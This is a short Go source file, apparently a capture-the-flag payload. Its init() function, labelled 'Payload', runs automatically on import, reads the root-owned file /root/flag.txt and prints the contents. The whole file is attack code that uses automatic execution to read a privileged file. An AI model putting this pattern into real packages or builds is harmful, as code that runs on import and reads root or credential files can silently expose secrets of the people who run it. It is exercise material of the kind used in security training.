package main

import (
    "fmt"
    "os"
)

func init() {
    // Payload: read the flag and print it
    data, err := os.ReadFile("/root/flag.txt")
    if err != nil {
        fmt.Println("[!] Failed to read flag:", err)
        return
    }
    fmt.Println("🏴 FLAG:", string(data))
}
